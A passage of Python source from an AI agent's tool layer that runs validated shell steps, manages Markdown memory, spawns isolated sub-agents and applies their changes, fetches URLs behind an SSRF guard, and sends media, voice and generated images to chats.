                    skill_dir = skill_info["path"]
                    if skill_dir.exists():
                        installer = SkillInstaller()
                        meta = installer._read_metadata(skill_dir / "SKILL.md")
                        deps_ok, missing, _required = installer._evaluate_skill_deps(
                            skill_dir, meta
                        )
                        if not deps_ok:
                            logger.warning(
                                f"Skill '{skill_info['name']}' failed; missing dependencies detected: {missing}"
                            )
                            output += (
                                "\n\n[SKILL_DEPS_MISSING] "
                                f"Skill '{skill_info['name']}' is missing dependencies. "
                                f"python={missing.get('python', [])}, "
                                f"node={missing.get('node', [])}, "
                                f"binaries={missing.get('binaries', [])}. "
                                "Install dependencies and retry."
                            )
            except Exception as e:
                logger.debug(f"Dependency check skipped: {e}")

            return output
        except Exception as e:
            return f"Error executing command: {e}"

    async def run_steps(self, commands: Any) -> str:
        """Run one or more shell commands in order without requiring &&."""
        if isinstance(commands, str):
            commands = [commands]
        if not isinstance(commands, list) or not commands:
            return "Error: run_steps requires a non-empty commands array."
        steps = [str(item).strip() for item in commands if str(item or "").strip()]
        if not steps:
            return "Error: run_steps requires a non-empty commands array."

        parts: List[str] = []
        for index, command in enumerate(steps, start=1):
            validation_error = self.validate_command(command)
            if validation_error:
                parts.append(
                    f"--- step {index}/{len(steps)} ---\n{command}\n{validation_error}"
                )
                return (
                    "Error: run_steps stopped after a rejected command.\n"
                    + "\n\n".join(parts)
                )
            result = await self.run_command(command)
            parts.append(f"--- step {index}/{len(steps)} ---\n{command}\n{result}")
            failed = str(result).startswith("Error:") or (
                "Exit Code:" in str(result)
                and not str(result).rstrip().endswith("Exit Code: 0")
                and "Success (Exit Code: 0" not in str(result)
            )
            if failed:
                return (
                    "Error: run_steps stopped after a failed command.\n"
                    + "\n\n".join(parts)
                )
        return "\n\n".join(parts)

    async def memory_search(self, query: str) -> str:
        """Search durable memory, using vectors when available and Markdown otherwise."""
        if not self.vector_service:
            return "Error: Vector service not available."
        try:
            results = await self.vector_service.search(query, limit=5) or []
            if not results:
                return "No matching memory found in MEMORY.md or the Markdown journals."

            mode = getattr(self.vector_service, "_last_search_mode", None)
            if mode == "vector":
                res = ["Found relevant memories (semantic vector search):"]
            else:
                res = ["Found relevant memories (Markdown fallback):"]
            for r in results:
                text = r.get("text", "No content")
                score = r.get("score")
                if score is None:
                    score = r.get("_distance", 0)
                path = r.get("path") or r.get("source") or "Unknown source"
                res.append(f"- {text}\n  (Source: {path}, Score: {score})")
            return "\n\n".join(res)
        except Exception as e:
            return f"Error searching memory: {e}"

    async def memory_save(self, content: str, scope: str = "journal") -> str:
        """Persist an explicit user-requested memory in the Markdown source of truth."""
        entry = str(content or "").strip()
        if not entry:
            return "Error: memory content cannot be empty."
        if len(entry) > 4_000:
            return "Error: memory content is too long (maximum 4000 characters)."

        normalized_scope = str(scope or "journal").strip().lower()
        if normalized_scope not in {"journal", "long_term"}:
            return "Error: scope must be 'journal' or 'long_term'."

        now = datetime.now()
        try:
            def atomic_write_text(target: Path, payload: str) -> None:
                temporary = target.with_name(
                    f".{target.name}.{uuid.uuid4().hex}.tmp"
                )
                try:
                    temporary.write_text(payload, encoding="utf-8")
                    os.replace(temporary, target)
                finally:
                    if temporary.exists():
                        temporary.unlink(missing_ok=True)

            if normalized_scope == "journal":
                await asyncio.to_thread(MEMORY_DIR.mkdir, parents=True, exist_ok=True)
                memory_file = MEMORY_DIR / f"{now:%Y-%m-%d}.md"
                line = f"- **[{now:%H:%M}]** {entry}"

                def append_if_new() -> bool:
                    existing = (
                        memory_file.read_text(encoding="utf-8")
                        if memory_file.exists()
                        else ""
                    )
                    if line in existing:
                        return False
                    prefix = "" if not existing or existing.endswith("\n") else "\n"
                    atomic_write_text(memory_file, f"{existing}{prefix}{line}\n")
                    return True

                written = await asyncio.to_thread(append_if_new)
                category = "journal"
                display_path = f"memory/{memory_file.name}"
            else:
                await asyncio.to_thread(
                    LONG_TERM_MEMORY_FILE.parent.mkdir,
                    parents=True,
                    exist_ok=True,
                )
                memory_file = LONG_TERM_MEMORY_FILE
                bullet = f"- {entry}"

                def append_long_term_if_new() -> bool:
                    existing = (
                        memory_file.read_text(encoding="utf-8").rstrip()
                        if memory_file.exists()
                        else "# Long-Term Memory"
                    )
                    if bullet in existing:
                        return False
                    separator = "\n" if existing.endswith("\n") else "\n\n"
                    atomic_write_text(memory_file, f"{existing}{separator}{bullet}\n")
                    return True

                written = await asyncio.to_thread(append_long_term_if_new)
                category = "long_term"
                display_path = "MEMORY.md"

            if written and self.vector_service:
                try:
                    asyncio.create_task(
                        self.vector_service.add_entry(entry, category=category)
                    )
                except RuntimeError:
                    # The Markdown write is durable even when no event loop is
                    # available to schedule optional vector indexing.
                    pass
            status = "saved" if written else "already present"
            return f"Memory {status} in {display_path}."
        except Exception as e:
            logger.error(f"Error saving memory: {e}")
            return f"Error saving memory: {e}"

    async def spawn_agent(
        self,
        task: str,
        session_key: str = None,
        agent: Optional[str] = None,
        background: Optional[bool] = None,
        isolation: str = "auto",
    ) -> str:
        """Spawn a sub-agent and optionally let it report back in the background."""
        if not self.agent:
            return "Error: Agent loop not linked to toolbox."

        requested_isolation = str(isolation or "auto").strip().lower()
        if requested_isolation not in {"auto", "copy", "none"}:
            return "Error: isolation must be one of: auto, copy, none."

        if not session_key:
            from core.context import tool_context

            ctx = tool_context.get()
            session_key = f"system:{ctx.get('chat_id', 'global')}"

        sub_session_key = f"{session_key}_sub_{uuid.uuid4().hex[:6]}"
        logger.info(f"🚀 Spawning sub-agent '{sub_session_key}' for task: {task}")

        subagent_profile = None
        if agent:
            logger.info(f"Using sub-agent profile '{agent}' for '{sub_session_key}'")
            if self.subagent_registry is not None:
                try:
                    subagent_profile = self.subagent_registry.get_subagent(agent)
                except Exception:
                    subagent_profile = None

        use_background = bool(background)
        if background is None and subagent_profile:
            use_background = bool(subagent_profile.get("background"))

        coding_task = bool(
            re.search(
                r"\b(code|coding|repo|repository|bug|fix|implement|edit|patch|review|verify|test|refactor|lint|diagnos)\w*\b",
                str(task or ""),
                re.IGNORECASE,
            )
        )
        use_isolated_copy = requested_isolation == "copy" or (
            requested_isolation == "auto"
            and (coding_task or agent in {"explorer", "reviewer", "verifier"})
        )
        isolation_mode = "copy" if use_isolated_copy else "none"
        isolated_workspace = None
        if use_isolated_copy:
            try:
                from core.workspace_isolation import IsolatedWorkspace

                isolated_workspace = await IsolatedWorkspace.create(
                    self._active_tool_root(), label=sub_session_key
                )
            except Exception as exc:
                logger.error(f"Could not create isolated sub-agent workspace: {exc}")
                return f"Error: Could not create isolated sub-agent workspace: {exc}"

        try:
            if use_background:
                task_id = await self.agent.start_background_subagent(
                    session_key,
                    sub_session_key,
                    task,
                    agent_name=agent,
                    isolated_workspace=isolated_workspace,
                    isolation_mode=isolation_mode,
                )
                # Ownership moves to the background task after it has been
                # registered.  The task wrapper cleans it up on exit.
                isolated_workspace = None
                mode_label = f"'{agent}'" if agent else "generic worker"
                isolation_label = (
                    " in an isolated copy" if isolation_mode == "copy" else ""
                )
                return (
                    f"Started background sub-agent {mode_label} as "
                    f"'{sub_session_key}' (task_id: {task_id}){isolation_label}. "
                    "It will report back when finished."
                )

            result = await self.agent.run_subagent(
                session_key,
                sub_session_key,
                task,
                agent_name=agent,
                isolated_workspace=isolated_workspace,
                isolation_mode=isolation_mode,
            )
            if (
                isolated_workspace is not None
                and isolated_workspace.root.exists()
                and not isolated_workspace.is_pending()
            ):
                capture = isolated_workspace.last_capture
                if capture is None:
                    capture = await isolated_workspace.capture()
                if capture.get("status") == "changed":
                    isolated_workspace.retain()
            return str(result)
        except Exception as e:
            logger.error(f"Error spawning agent: {e}")
            return f"Error spawning agent: {e}"
        finally:
            if isolated_workspace is not None and not isolated_workspace.is_pending():
                try:
                    await isolated_workspace.cleanup()
                except Exception as cleanup_error:
                    logger.warning(
                        f"Could not clean up isolated sub-agent workspace: {cleanup_error}"
                    )

    async def apply_workspace_changeset(
        self,
        workspace_id: Optional[str] = None,
        changeset: Optional[Any] = None,
    ) -> str:
        """Apply a retained copy-isolation capture to the live tree, then delete leftovers."""
        from core.context import workspace_context
        from core.workspace_isolation import (
            IsolatedWorkspace,
            cleanup_leftover_clones,
            get_pending_workspace,
            latest_pending_workspace,
        )

        workspace: Optional[IsolatedWorkspace] = None
        capture: Optional[Dict[str, Any]] = None
        requested_id = str(workspace_id or "").strip()
        if requested_id:
            workspace = get_pending_workspace(requested_id)
        if workspace is None and not requested_id:
            workspace = latest_pending_workspace()
        if changeset:
            if isinstance(changeset, str):
                try:
                    changeset = json.loads(changeset)
                except json.JSONDecodeError as exc:
                    return f"Error: changeset is not valid JSON: {exc}"
            if not isinstance(changeset, dict):
                return "Error: changeset must be an object with changed_files."
            capture = changeset
            capture_id = str(capture.get("workspace_id") or "").strip()
            if workspace is None and capture_id:
                workspace = get_pending_workspace(capture_id)
        if workspace is None and capture is None:
            return (
                "Error: No retained isolated workspace to apply. "
                "spawn_agent(isolation='copy') must finish with changes first."
            )
        if capture is None and workspace is not None:
            if workspace.last_capture is not None:
                capture = workspace.last_capture
            else:
                capture = await workspace.capture()
        if not isinstance(capture, dict):
            return "Error: Isolated workspace capture is missing."

        changed_files = list(capture.get("changed_files") or [])
        source_root = (
            workspace.source_root
            if workspace is not None
            else Path(str(capture.get("source_root") or Path.cwd())).resolve()
        )
        apply_token = workspace_context.set({})
        applied: List[Dict[str, Any]] = []
        try:
            for item in changed_files:
                if not isinstance(item, dict):
                    continue
                relative = str(item.get("path") or "").strip()
                if not relative or relative.startswith("/") or ".." in Path(relative).parts:
                    return f"Error: Refusing to apply unsafe path '{relative}'."
                live_path = str((source_root / relative).resolve())
                status = str(item.get("status") or "modified")
                if status == "deleted":
                    result = await self.delete_file(live_path)
                    applied.append({"path": relative, "status": status, "result": result})
                    if str(result).startswith("Error:"):
                        return json.dumps(
                            {"status": "error", "applied": applied, "failed": relative},
                            ensure_ascii=False,
                        )
                    continue
                after_text = (
                    workspace.applyable_file_text(item)
                    if workspace is not None
                    else item.get("after_text")
                )
                if not isinstance(after_text, str):
                    return (
                        f"Error: No applyable UTF-8 content for '{relative}'. "
                        "The clone was deleted before apply and the capture had no after_text."
                    )
                before_sha = str(item.get("before_sha256") or "").strip().lower()
                before_text = (
                    workspace.applyable_before_text(item)
                    if workspace is not None
                    else item.get("before_text")
                )
                if status == "added" or not Path(live_path).exists():
                    result = await self.write_file(live_path, after_text)
                elif (
                    isinstance(before_text, str)
                    and re.fullmatch(r"[0-9a-f]{64}", before_sha)
                ):
                    result = await self.edit_file(
                        live_path,
                        [{"old_text": before_text, "new_text": after_text}],
                        before_sha,
                    )
                else:
                    if re.fullmatch(r"[0-9a-f]{64}", before_sha) and Path(live_path).is_file():
                        current_sha = hashlib.sha256(Path(live_path).read_bytes()).hexdigest()
                        if current_sha != before_sha:
                            return (
                                f"Error: Stale apply for '{relative}'. Live SHA-256 is "
                                f"{current_sha}, not {before_sha}."
                            )
                    result = await self.write_file(live_path, after_text)
                applied.append({"path": relative, "status": status, "result": result})
                if str(result).startswith("Error:"):
                    return json.dumps(
                        {"status": "error", "applied": applied, "failed": relative},
                        ensure_ascii=False,
                    )
        finally:
            workspace_context.reset(apply_token)

        if workspace is not None:
            await workspace.cleanup()
        leftovers = cleanup_leftover_clones(source_root)
        return json.dumps(
            {
                "status": "applied",
                "workspace_id": (
                    workspace.workspace_id if workspace is not None else capture.get("workspace_id")
                ),
                "applied": [
                    {"path": item["path"], "status": item["status"]} for item in applied
                ],
                "cleaned_leftovers": leftovers,
            },
            ensure_ascii=False,
        )

    @staticmethod
    def _is_safe_public_url(url: str) -> tuple[bool, str]:
        """SSRF guard: only http(s) to a resolvable, public IP address.

        LimeBot runs on a personal machine, so a URL supplied by the LLM (from a
        prompt-injected page or a Discord message) must never be able to reach
        loopback/private/link-local services. Every resolved address is checked.
        """
        url = str(url or "").strip()
        if not url:
            return False, "Empty URL."
        try:
            parsed = urllib.parse.urlparse(url)
        except Exception:
            return False, "Invalid URL."
        if parsed.scheme not in ("http", "https"):
            return False, f"Only http(s) URLs are allowed (got '{parsed.scheme or 'none'}')."
        host = parsed.hostname
        if not host:
            return False, "URL has no host."
        try:
            port = parsed.port or (443 if parsed.scheme == "https" else 80)
        except ValueError:
            return False, "Invalid port in URL."
        try:
            infos = socket.getaddrinfo(host, port, proto=socket.IPPROTO_TCP)
        except Exception as e:
            return False, f"Could not resolve host '{host}': {e}"
        for info in infos:
            ip_str = info[4][0]
            try:
                ip = ipaddress.ip_address(ip_str)
            except ValueError:
                return False, f"Invalid resolved address for '{host}'."
            if (
                ip.is_private
                or ip.is_loopback
                or ip.is_link_local
                or ip.is_reserved
                or ip.is_multicast
                or ip.is_unspecified
            ):
                return False, (
                    f"Refusing to fetch a non-public address ({ip_str}) for host '{host}'."
                )
        return True, ""

    async def _safe_fetch(
        self, url: str, *, max_bytes: int, timeout: float
    ) -> tuple[str, str, bytes]:
        """Fetch a URL, validating every redirect hop against the SSRF guard.

        Returns (final_url, content_type, body_bytes). Raises ValueError for
        unsafe hosts, oversized responses, or redirect loops.
        """
        try:
            import httpx
        except Exception as e:  # pragma: no cover - httpx is a core dep
            raise ValueError(f"httpx is required for URL fetching: {e}")

        headers = {
            "User-Agent": _DOWNLOAD_UA,
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Referer": "https://www.google.com/",
        }
        current = url
        async with httpx.AsyncClient(
            timeout=timeout, follow_redirects=False, headers=headers
        ) as client:
            for _ in range(6):
                ok, reason = self._is_safe_public_url(current)
                if not ok:
                    raise ValueError(reason)
                async with client.stream("GET", current) as response:
                    if response.is_redirect:
                        location = response.headers.get("location", "")
                        if not location:
                            raise ValueError("Redirect without a location header.")
                        current = urllib.parse.urljoin(current, location)
                        continue
                    response.raise_for_status()
                    content_type = (
                        (response.headers.get("content-type") or "")
                        .split(";")[0]
                        .strip()
                        .lower()
                    )
                    buf = bytearray()
                    total = 0
                    async for chunk in response.aiter_bytes():
                        total += len(chunk)
                        if total > max_bytes:
                            raise ValueError(
                                f"Response exceeds the {max_bytes // (1024 * 1024)}MB limit."
                            )
                        buf.extend(chunk)
                    return current, content_type, bytes(buf)
        raise ValueError("Too many redirects.")

    @staticmethod
    def _guess_download_extension(data: bytes, content_type: str, url: str) -> str:
        """Pick a file extension from magic bytes, then content-type, then URL."""
        if data[:3] == b"\xff\xd8\xff":
            return ".jpg"
        if data[:8] == b"\x89PNG\r\n\x1a\n":
            return ".png"
        if data[:4] == b"GIF8":
            return ".gif"
        if data[:4] == b"RIFF" and data[8:12] == b"WEBP":
            return ".webp"
        if data[:4] == b"%PDF":
            return ".pdf"
        if content_type:
            ext = mimetypes.guess_extension(content_type)
            if ext:
                return ".jpg" if ext == ".jpe" else ext
        suffix = Path(urllib.parse.urlparse(url).path).suffix
        if suffix and len(suffix) <= 6 and re.fullmatch(r"\.[A-Za-z0-9]+", suffix):
            return suffix
        return ".bin"

    async def fetch_url_to_temp(
        self, url: str, max_bytes: int = _MAX_DOWNLOAD_BYTES
    ) -> str:
        """Download a public http(s) URL into temp/downloads and return its path."""
        url = str(url or "").strip()
        ok, reason = self._is_safe_public_url(url)
        if not ok:
            return f"Error: {reason}"

        await self.send_progress(f"⬇️ Downloading: {url}")
        dest_dir = self.allowed_paths[0] / "temp" / "downloads"
        try:
            await asyncio.to_thread(lambda: dest_dir.mkdir(parents=True, exist_ok=True))
        except Exception as e:
            return f"Error: Could not create download directory: {e}"

        try:
            final_url, content_type, data = await self._safe_fetch(
                url, max_bytes=max_bytes, timeout=30.0
            )
        except ValueError as e:
            return f"Error: {e}"
        except Exception as e:
            return f"Error: Download failed: {e}"

        if not data:
            return "Error: Downloaded file was empty."

        ext = self._guess_download_extension(data, content_type, final_url)
        dest = dest_dir / f"dl_{uuid.uuid4().hex[:12]}{ext}"
        try:
            await asyncio.to_thread(dest.write_bytes, data)
        except Exception as e:
            return f"Error: Could not save file: {e}"
        return self._to_display_path(dest)

    @staticmethod
    def _html_to_text(html: str) -> str:
        """Best-effort readable text from HTML (BeautifulSoup if available)."""
        try:
            from bs4 import BeautifulSoup
        except Exception:
            return re.sub(r"<[^>]+>", " ", html)
        soup = BeautifulSoup(html, "html.parser")
        for tag in soup(
            ["script", "style", "noscript", "nav", "footer", "header", "svg", "form"]
        ):
            tag.decompose()
        text = soup.get_text("\n", strip=True)
        return re.sub(r"\n{3,}", "\n\n", text)

    async def fetch_readable_text(self, url: str, max_chars: int = 4000) -> str:
        """Fetch a page and return its readable text, SSRF-guarded."""
        url = str(url or "").strip()
        ok, reason = self._is_safe_public_url(url)
        if not ok:
            return f"Error: {reason}"
        try:
            _final_url, content_type, data = await self._safe_fetch(
                url, max_bytes=5 * 1024 * 1024, timeout=20.0
            )
        except ValueError as e:
            return f"Error: {e}"
        except Exception as e:
            return f"Error: Fetch failed: {e}"

        text = data.decode("utf-8", errors="ignore")
        if "html" in content_type or "<html" in text[:2000].lower():
            text = self._html_to_text(text)
        text = text.strip()
        if not text:
            return "Error: No readable text found at that URL."
        if len(text) > max_chars:
            text = text[:max_chars] + f"\n... (truncated at {max_chars} chars)"
        return text

    async def _publish_web_media(self, file_path: Path, caption: str) -> None:
        """Publish a local file to the web chat as a servable attachment."""
        from core.context import tool_context
        from core.events import OutboundMessage

        ctx = tool_context.get() or {}
        chat_id = (ctx.get("chat_id") or "").strip()
        if not chat_id:
            return

        # Ensure the file lives under temp/ so the /temp static mount can serve it.
        temp_root = (self.allowed_paths[0] / "temp").resolve()
        try:
            file_path.resolve().relative_to(temp_root)
            servable = file_path
        except Exception:
            dl_dir = self.allowed_paths[0] / "temp" / "downloads"
            await asyncio.to_thread(
                lambda: dl_dir.mkdir(parents=True, exist_ok=True)
            )
            servable = dl_dir / file_path.name
            await asyncio.to_thread(shutil.copyfile, file_path, servable)

        mime_type = mimetypes.guess_type(servable.name)[0] or "application/octet-stream"
        is_image = mime_type.startswith("image/")
        url = ""
        try:
            rel = servable.resolve().relative_to(temp_root)
            url = f"/temp/{rel.as_posix()}"
        except Exception:
            if is_image:
                try:
                    blob = await asyncio.to_thread(servable.read_bytes)
                    url = (
                        f"data:{mime_type};base64,"
                        f"{base64.b64encode(blob).decode('ascii')}"
                    )
                except Exception:
                    url = ""

        attachment = {
            "name": servable.name,
            "kind": "image" if is_image else "document",
            "mime_type": mime_type,
            "mimeType": mime_type,
            "path": self._to_display_path(servable),
            "url": url,
        }
        metadata: Dict[str, Any] = {"attachments": [attachment]}
        if is_image and url:
            metadata["image"] = url
        turn_id = str(ctx.get("turn_id") or "").strip()
        message_id = str(ctx.get("message_id") or "").strip()
        if turn_id:
            metadata["turn_id"] = turn_id
        if message_id:
            metadata["message_id"] = message_id
        await self.bus.publish_outbound(
            OutboundMessage(
                channel="web", chat_id=chat_id, content=caption, metadata=metadata
            )
        )

    async def send_media(self, path: str, caption: str = "") -> str:
        """Share a local file OR a remote http(s) URL into the current chat.

        Works for web, Discord, and WhatsApp. Remote URLs are downloaded into
        temp/downloads first (SSRF-guarded), then delivered as a local file, so
        the agent can act on image URLs found via web_search.
        """
        from core.context import tool_context
        from core.events import OutboundMessage

        ctx = tool_context.get() or {}
        channel = (ctx.get("channel") or "").strip().lower()
        chat_id = (ctx.get("chat_id") or "").strip()

        if channel not in {"discord", "whatsapp", "web"}:
            return (
                "Error: send_media is only available in web, Discord, or WhatsApp "
                "conversations."
            )
        if not chat_id:
            return "Error: Missing current chat context for media delivery."

        source = str(path or "").strip()
        if not source:
            return "Error: A local file path or http(s) URL is required."

        turn_id = str(ctx.get("turn_id") or "").strip()
        if source.lower().startswith(("http://", "https://")):
            media_fingerprint = source
        else:
            try:
                media_fingerprint = os.path.normcase(
                    str(self._resolve_tool_path(source))
                )
            except Exception:
                media_fingerprint = os.path.normcase(os.path.normpath(source))

        delivered_this_turn = self._sent_media_by_turn.get(turn_id, set())
        if turn_id and media_fingerprint in delivered_this_turn:
            return (
                "ACTION BLOCKED: Duplicate send_media suppressed because this "
                "file was already delivered during the current turn. Continue "
                "with the task or reply in text instead of sending it again."
            )

        if source.lower().startswith(("http://", "https://")):
            downloaded = await self.fetch_url_to_temp(source)
            if downloaded.startswith("Error:"):
                return downloaded
            path = downloaded

        ok, error, resolved = self._is_path_shareable(path)
        if not ok or resolved is None:
            return f"Error: {error}"

        caption = str(caption or "").strip()

        outbound_meta: Dict[str, Any] = {
            "type": "file",
            "file_path": str(resolved),
            "caption": caption,
        }
        if turn_id:
            outbound_meta["turn_id"] = turn_id
        message_id = str(ctx.get("message_id") or "").strip()
        if message_id:
            outbound_meta["message_id"] = message_id

        if channel == "web":
            await self._publish_web_media(resolved, caption)
            if turn_id:
                self._remember_sent_media(turn_id, media_fingerprint)
            return f"Displayed '{self._to_display_path(resolved)}' in the web chat."

        await self.bus.publish_outbound(
            OutboundMessage(
                channel=channel,
                chat_id=chat_id,
                content="",
                metadata=outbound_meta,
            )
        )
        if turn_id:
            self._remember_sent_media(turn_id, media_fingerprint)
        display_path = self._to_display_path(resolved)
        return f"Sent '{display_path}' to the current {channel} chat."

    async def attach_chat_image(self, image_url: str, caption: str = "") -> str:
        """Host-owned download + stamp of an existing photo into the current chat.

        Used after web_search(kind='images') whenever a hit has an image URL.
        Not a model-facing tool. Verb lists do not gate this path.
        """
        return await self.send_media(image_url, caption)

    def _remember_sent_media(self, turn_id: str, fingerprint: str) -> None:
        """Remember successful media deliveries without growing forever."""
        bucket = self._sent_media_by_turn.setdefault(turn_id, set())
        bucket.add(fingerprint)
        while len(self._sent_media_by_turn) > 128:
            oldest_turn = next(iter(self._sent_media_by_turn))
            self._sent_media_by_turn.pop(oldest_turn, None)

    def media_delivered_this_turn(self, turn_id: str) -> bool:
        """True when host or send_media already delivered a file this turn."""
        tid = str(turn_id or "").strip()
        if not tid:
            return False
        return bool(self._sent_media_by_turn.get(tid))

    async def send_voice(self, text: str, channel: str = "") -> str:
        """Speak `text` aloud as a voice message in the current chat.

        Synthesizes speech with ElevenLabs and delivers it as audio: an mp3 file
        on Discord/WhatsApp, or an inline playable clip on web. Use this when the
        user asks to be sent a voice message / voice note instead of text.

        Requires an ElevenLabs API key (Settings → Credentials). Returns an
        "Error: ..." string if voice is unavailable so you can fall back to text.
        """
        from core.context import tool_context
        from core.events import OutboundMessage

        try:
            from core.tts import ElevenLabsTTS
        except Exception as e:  # pragma: no cover - defensive import guard
            return f"Error: voice synthesis is unavailable ({e})."

        ctx = tool_context.get() or {}
        ctx_channel = (ctx.get("channel") or "").strip().lower()
        target = (str(channel or "").strip().lower()) or ctx_channel
        chat_id = (ctx.get("chat_id") or "").strip()

        if target not in {"discord", "whatsapp", "web"}:
            return (
                "Error: send_voice is only available in web, Discord, or WhatsApp "
                "conversations."
            )
        if not chat_id:
            return "Error: Missing current chat context for voice delivery."

        spoken = str(text or "").strip()
        if not spoken:
            return "Error: Text to speak is required."

        if not ElevenLabsTTS.get_api_key():
            return (
                "Error: ElevenLabs API key is not configured. Add it under "
                "Settings → Credentials to enable voice."
            )

        if target == "web":
            audio_url = await ElevenLabsTTS.synthesize_and_save(spoken)
            if not audio_url:
                return "Error: Voice synthesis failed."
            await self.bus.publish_outbound(
                OutboundMessage(
                    channel="web",
                    chat_id=chat_id,
                    content="",
                    metadata={"voice_url": audio_url},
                )
            )
            return "Sent a voice message to the web chat."

        audio_path = await ElevenLabsTTS.synthesize_to_file(spoken)
        if not audio_path:
            return "Error: Voice synthesis failed."
        await self.bus.publish_outbound(
            OutboundMessage(
                channel=target,
                chat_id=chat_id,
                content="",
                metadata={
                    "type": "file",
                    "file_path": audio_path,
                    "caption": "",
                    "cleanup_file": True,
                },
            )
        )
        return f"Sent a voice message to the current {target} chat."

    @staticmethod
    def _normalize_image_model(model: str) -> str:
        return str(model or "").strip()

    @staticmethod
    def _is_gemini_image_model(model: str) -> bool:
        normalized = str(model or "").strip()
        bare = normalized.split("/", 1)[-1]
        return normalized.startswith(("gemini/", "google/")) and (
            "flash-image" in bare
            or "pro-image" in bare
            or "image-preview" in bare
        )

    @staticmethod
    def _is_openai_image_model(model: str) -> bool:
        bare = str(model or "").strip().split("/", 1)[-1]
        return (
            bare.startswith(("gpt-image-", "dall-e-"))
            or bare == "chatgpt-image-latest"
        )

    @staticmethod
    def _is_negated_image_generation_prompt(prompt: str) -> bool:
        """Detect explicit instructions saying that no image should be made."""
        normalized = str(prompt or "").strip().lower()
        patterns = (
            r"\bno\s+image\s+generation\s+(?:is\s+)?needed\b",
            r"\b(?:do\s+not|don't|dont)\s+(?:generate|create|draw|render)\s+"
            r"(?:an?\s+)?(?:image|picture|photo)\b",
            r"\bno\s+(?:es\s+)?necesari[oa]\s+(?:generar|crear|dibujar|renderizar)\s+"
            r"(?:una?\s+)?(?:imagen|foto)\b",
        )
        return any(re.search(pattern, normalized) for pattern in patterns)

    @staticmethod
    def _image_extension_for_mime(mime_type: str) -> str:
        normalized = (mime_type or "image/png").split(";", 1)[0].strip().lower()
        if normalized == "image/jpeg":
            return ".jpg"
        if normalized == "image/webp":
            return ".webp"
        return mimetypes.guess_extension(normalized) or ".png"

    @staticmethod
    def _gemini_aspect_ratio(size: str) -> str:
        normalized = str(size or "").strip().lower()
        if not normalized:
            return ""
        if ":" in normalized and "x" not in normalized:
            return normalized
        ratios = {
            "1024x1024": "1:1",
            "1536x1024": "3:2",
            "1024x1536": "2:3",
            "1792x1024": "16:9",
            "1024x1792": "9:16",
        }
        return ratios.get(normalized, "")

    @staticmethod
    def _codex_account_id(token: str) -> str:
        try:
            parts = str(token or "").split(".")
            if len(parts) != 3:
                return ""
            payload = parts[1] + "=" * (-len(parts[1]) % 4)
            claims = json.loads(base64.urlsafe_b64decode(payload.encode("ascii")))
            auth = claims.get("https://api.openai.com/auth") or {}
            return str(auth.get("chatgpt_account_id") or "").strip()
        except Exception:
            return ""

    @staticmethod
    def _codex_image_model(model: str) -> str:
        normalized = str(model or "").strip()
        if normalized.startswith("openai-codex/"):
            bare = normalized.removeprefix("openai-codex/")
            if bare and not bare.startswith(("gpt-image-", "dall-e-")):
                return bare
        return "gpt-5.4-mini"

    def _image_model_candidates(self, requested_model: str) -> List[str]:
        requested = self._normalize_image_model(requested_model)
        image_cfg = getattr(self.config, "image_generation", None)
        configured = self._normalize_image_model(getattr(image_cfg, "model", ""))
        primary_chat = str(getattr(getattr(self.config, "llm", None), "model", "") or "")
        codex_model = (
            primary_chat
            if primary_chat.startswith("openai-codex/")
            else "openai-codex/gpt-5.4-mini"
        )

        raw_candidates = [requested, configured, codex_model, "openai/gpt-image-2"]
        candidates: List[str] = []
        for candidate in raw_candidates:
            candidate = str(candidate or "").strip()
            if not candidate or candidate in candidates:
                continue
            if self._is_gemini_image_model(candidate) and not os.getenv("GEMINI_API_KEY"):
                continue
            if candidate.startswith("openai/") and not os.getenv("OPENAI_API_KEY"):
                continue
            candidates.append(candidate)
        return candidates

    async def _resolve_image_references(
        self,
        reference_images: Optional[List[str]],
        use_attached_images: Optional[bool],
    ) -> tuple[List[Dict[str, Any]], bool]:
        from core.context import tool_context

        explicit = (
            [reference_images]
            if isinstance(reference_images, str)
            else list(reference_images or [])
        )
        ctx = tool_context.get() or {}
        should_use_attached = (
            bool(ctx.get("auto_reference_images"))
            if use_attached_images is None
            else bool(use_attached_images)
        )
        candidates: List[str] = [str(path or "").strip() for path in explicit]
        if should_use_attached:
            for attachment in [
                *(ctx.get("attachments") or []),
                *(ctx.get("recent_image_attachments") or []),
            ]:
                if not isinstance(attachment, dict):
                    continue
                path = str(attachment.get("path") or "").strip()
                if path:
                    candidates.append(path)

        reference_requested = bool(explicit) or should_use_attached
        references: List[Dict[str, Any]] = []
        seen: set[Path] = set()
        for candidate in candidates:
            if not candidate:
                continue
            allowed, reason, path = self._is_path_shareable(candidate)
            if not allowed or path is None:
                if explicit:
                    raise ValueError(reason or f"Reference image is unavailable: {candidate}")
                continue
            if path in seen:
                continue
            if path.suffix.lower() not in _IMAGE_REFERENCE_EXTENSIONS:
                raise ValueError(
                    f"Unsupported reference image format '{path.suffix or 'unknown'}'. "
                    "Use PNG, JPEG, or WebP."
                )
            size = path.stat().st_size
            if size <= 0 or size > _MAX_IMAGE_REFERENCE_BYTES:
                raise ValueError(
                    f"Reference image '{path.name}' must be between 1 byte and 50 MiB."
                )
            blob = await asyncio.to_thread(path.read_bytes)
            mime_type = mimetypes.guess_type(path.name)[0] or "image/png"
            references.append(
                {
                    "name": path.name,
                    "path": path,
                    "mime_type": mime_type,
                    "bytes": blob,
                    "data_url": (
                        f"data:{mime_type};base64,"
                        f"{base64.b64encode(blob).decode('ascii')}"
                    ),
                }
            )
            seen.add(path)
            if len(references) >= _MAX_IMAGE_REFERENCES:
                break

        return references, reference_requested

    async def _generate_codex_image(
        self,
        prompt: str,
        model: str,
        count: int,
        size: str,
        quality: str,
        references: Optional[List[Dict[str, Any]]] = None,
    ) -> List[Dict[str, str]]:
        from core.oauth_profiles import resolve_codex_oauth_api_key

        import httpx

        token = resolve_codex_oauth_api_key()
        account_id = self._codex_account_id(token)
        if not account_id:
            raise RuntimeError("Codex OAuth token did not include a ChatGPT account id.")

        prompt_hints = []
        if size:
            prompt_hints.append(f"Output size/aspect request: {size}.")
        if quality and quality != "auto":
            prompt_hints.append(f"Quality request: {quality}.")
        full_prompt = prompt
        if prompt_hints:
            full_prompt = f"{prompt}\n\n" + "\n".join(prompt_hints)

        input_content: List[Dict[str, Any]] = [
            {"type": "input_text", "text": full_prompt}
        ]
        input_content.extend(
            {
                "type": "input_image",
                "image_url": reference["data_url"],
            }
            for reference in (references or [])
        )

        payload = {
            "model": self._codex_image_model(model),
            "instructions": (
                "Generate exactly one image using the hosted image_generation tool. "
                "Return no text unless required."
            ),
            "store": False,
